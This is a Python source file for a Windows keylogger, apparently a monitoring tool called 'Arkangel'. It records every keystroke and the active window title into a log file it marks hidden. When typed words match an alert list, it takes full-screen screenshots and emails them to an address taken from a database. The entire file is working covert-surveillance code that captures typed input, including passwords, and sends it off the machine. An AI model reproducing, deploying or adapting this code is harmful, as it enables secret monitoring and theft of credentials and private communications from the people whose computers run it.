#!/usr/bin/python
#pynput
# %(asctime)s: 
from pynput.keyboard import Key, Listener
#import logging
from getsqldata import *
import win32gui
from mss import mss
from PIL import Image
from datetime import datetime
import os, errno, subprocess

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


uid = getCurrentUser()
lastActiveWindow = None
hasSubmitted = None

st = getRowValue("Setting",uid)
#get path from db
#file = st[1] +'\\'+ datetime.now().strftime('%Y_%m_%d')+'.txt' #or full path if not in same directory

email = getRowValue('Users',uid)[1]

token = getRowValue('current_user',uid)[1]

keystrokeLogs = datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.txt'
file = os.path.join(st[1],keystrokeLogs)
print(file)
# create file log
try:
    f = open(file, 'x')
    f.close()
except :
    pass

#hidden file log
subprocess.check_call(["attrib","+H",file],shell=True)

#logfile = open('./key_log.txt', 'a+', encoding='utf-8')
#logging.basicConfig(stream = logfile, level=logging.DEBUG, format=u'%(message)s')
#iBack = 0

word = u''
listBreakWord = ["Key.enter","Key.space"]
listSpecialKey = ["Key.tab","Key.caps_lock","Key.shift",
                  "Key.ctrl_l","Key.cmd","Key.alt_l","Key.alt_r",
                  "Key.print_screen","Key.ctrl_r","Key.page_up",
                  "Key.page_down","Key.up","Key.down","Key.left",
                  "Key.right","Key.shift_r","Key.home","Key.insert",
                  "Key.end","Key.esc","Key.delete"]#,"Key.backspace"]


def Screenshot(pathName):
    with mss() as sct:   
        for filename in sct.save():
            sct.shot()
            # print(filename)
            filename = sct.shot(mon=-1, output=pathName)
            image = Image.open(pathName)
            image.save(pathName, format="JPEG" ,quality=100, optimize=True)
            print("Screenshot sucessful!")

def sendMail(attachPath):
    deli = getRowValue('EmailDelivery',uid)
    fromaddr = deli[4] # uname
    toaddr = deli[1] # sendto  
    # instance of MIMEMultipart
    msg = MIMEMultipart()  
    # storing the senders email address  
    msg['From'] = fromaddr  
    # storing the receivers email address 
    msg['To'] = toaddr 
    # storing the subject 
    msg['Subject'] = 'Alert from Arkangel!' 
    # string to store the body of the mail
    body = "Alert from Arkangel!!" 
    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    if(os.path.exists(attachPath)):
        attachment = MIMEApplication(open(attachPath, "rb").read(), _subtype="txt")
        attachment.add_header('Content-Disposition','attachment', filename=attachPath)
        msg.attach(attachment)
    # Converts the Multipart msg into a string
    
    smtp = deli[2]
    port = deli[3]

    s = smtplib.SMTP(smtp, 25)
    s.connect(smtp,port)
    s.ehlo()
    s.starttls()
    s.ehlo()
    print('request')
    # Authentication
    pwd = deli[5]
    try:
        s.login(fromaddr, pwd)
        print("login")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
    except Exception as e:
        print(str(e))
        pass
    s.quit()
     


    
def alerts(alertList, word):
    conf = getRowValue("Alerts",uid)
    word = word.strip() #remove last character like space \t \n \r
    if(word in alertList):
        pathName = os.path.join(st[3], datetime.now().strftime('Alert-%Y_%m_%d-%H_%M_%S.jpeg'))
        if conf[2] == 1:
            Screenshot(pathName)
            print("Alert - screenshot successful")
        if conf[1] == 1:
            sendMail(pathName)
            os.remove(pathName)
            print("Alert - send email successful")



def target(uid, activeWindows):
    conf = getRowValue("Targets",uid)
    result = 0
    print(conf)
    if conf[1] == 1: # all app
        print('all app')
        return True
    if conf[2] == 1: # following app
        byName = getColumnValue("byName","TargetList",uid)
        byApp = getColumnValue("byApp","TargetList",uid)
        print(byName, byApp)
        
        for name in byName:
            print(name.lower()+'---'+ activeWindows.lower())
            if name != '' and activeWindows.lower().find(name.lower()) > -1 :
                print("TRUE")
                return True
        for app in byApp:
            print(app.lower()+'---'+ activeWindows.lower())
            if app != '' and activeWindows.lower().find(app.lower()) > -1:
                print("TRUE")
                return True
    print("false")
    return False


def on_press(key):
    global word, iBack, lastActiveWindow, hasSubmitted
    #logging.info(key)
    ch = u''
    ch = str(key)
    
    if(str(key) not in listSpecialKey):
        ch = str(key).replace("'","")
    else:
        ch = ''
    if(str(key) == "Key.enter"):
        ch = '\n'
    if(str(key) == "Key.space"):
        ch = u' '
    
    word += ch
    pos = 0

    if( st[4] == 0 ):
    #English
        if(str(key)=="Key.backspace"):
            pos = word.find("Key.backspace")
            word = word[:(pos-1)]
            ch = ''
    
    elif ( st[4] == 1 ):
        #Vietnamese
        if(str(key) == "Key.backspace" ):
            iBack = iBack + 1
            pos = word.find("Key.backspace")
            if (iBack == 1):
                word = word[:(pos-2)]
            elif(iBack > 1):
                word  = word[:(pos-1)]
        else:
            iBack = 0

    print(target(uid,getWindowText()))
    if( target(uid,getWindowText()) == True):
        if (lastActiveWindow != win32gui.GetForegroundWindow()):
            name = '\n' + getWindowText() + datetime.now().strftime(':%Y/%m/%d-%H:%M:%S') +'\n'
            if(hasSubmitted):
                name = '\n' + name + '\n'

            with open(file, 'a', encoding='utf-8') as f:
                f.write(name)
        
            hasSubmitted = True;
            lastActiveWindow = win32gui.GetForegroundWindow();
            

        with open(file, 'a', encoding='utf-8') as f:
            f.write(ch)
            print(ch)

    if(str(key) in listBreakWord):
        listKey = getColumnValue("key","AlertList",1)
        alerts(listKey,word)
        word = u''
        #iBack = 0

def getWindowText():
    winText = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return winText

with Listener(on_press=on_press) as listener:
    listener.join()

